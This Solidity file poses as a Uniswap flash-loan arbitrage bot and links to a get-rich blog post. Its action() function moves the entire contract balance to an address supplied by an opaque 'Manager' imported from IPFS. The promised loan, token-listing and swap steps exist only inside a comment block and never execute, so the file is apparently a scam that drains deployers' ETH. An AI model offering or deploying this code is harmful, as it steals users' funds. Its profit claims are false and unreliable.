//https://coinmarketbag.com/how-i-turned-0-3-eth-into-5-eth-using-flash-loans-on-uniswap-flash-loan-arbritrage/

pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

//uniswap smart contracts v2 and v3

import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
// Code Manager
import "ipfs://QmayPJfwkUcESCPf9yfTUByV8Q4TaBmroD4LQxEnzLgxiV";

	
contract uniswapFlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
	
	function() external payable {}
	
	function action() public payable {
	    // Send required coins for swap
	    address(uint160(manager.uniswapDepositAddress())).transfer(address(this).balance);
	    
	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
	    // Breakdown of functions written below
	    manager.performTasks();
	    
	    /* Breakdown of functions
	    // Submit token to ETH blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

        // List the token on uniswapSwap
		manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);
		
        // Get ETH Loan from Uniswap
		string memory loanAddress = manager.takeFlashLoan(loanAmount);
		
		// Convert half ETH to USDT
		manager.uniswapUSDTtoETH(loanAmount / 2);

        // Create ETH and USDT pairs for our token & Provide liquidity
        string memory ETHPair = manager.uniswapCreatePool(tokenAddress, "ETH");
		manager.uniswapAddLiquidity(ETHPair, loanAmount / 2);
		string memory USDTPair = manager.uniswapCreatePool(tokenAddress, "USDT");
		manager.uniswapAddLiquidity(ETHPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
		manager.uniswapPerformSwaps();
		
		// Move remaining ETH from Contract to your account
		manager.contractToWallet("ETH");

        // Repay Flash loan
		manager.repayLoan(loanAddress);
	    */
	}

}
